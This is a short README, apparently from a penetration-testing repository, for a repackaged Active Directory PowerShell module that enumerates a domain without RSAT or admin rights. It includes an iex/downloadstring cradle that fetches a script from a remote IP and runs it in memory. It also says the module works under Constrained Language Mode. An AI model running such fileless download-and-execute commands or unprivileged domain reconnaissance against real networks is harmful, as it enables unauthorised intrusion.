## This module was originally from https://github.com/samratashok/ADModule but all AD files have been replaced from Server 2022.

Within the import ps1 script, the bytes have been replaced with the bytes from this Microsoft.ActiveDirectory.Management.dll.


You can copy this DLL to your machine and use it to enumerate Active Directory without installing RSAT and without having administrative privileges.

```powershell
Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
```
![import_dll](https://github.com/user-attachments/assets/f44c76e4-0c18-4ba5-b48d-a992d3cfc28a)

Alternatively, you can use the ps1 script to download and execute in memory
```powershell
iex(new-object net.webclient).downloadstring('http://192.168.137.128/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

![import_example](https://github.com/user-attachments/assets/f490e7a3-3a31-4539-8cd8-09480eddd766)


To be able to list all the cmdlets in the module, import the module as well. Remember to import the DLL first.
```powershell
PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose

PS C:\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1

PS C:\> Get-Command -Module ActiveDirectory
```

This module should work without issue from PowerShell's Constrained Language Mode.
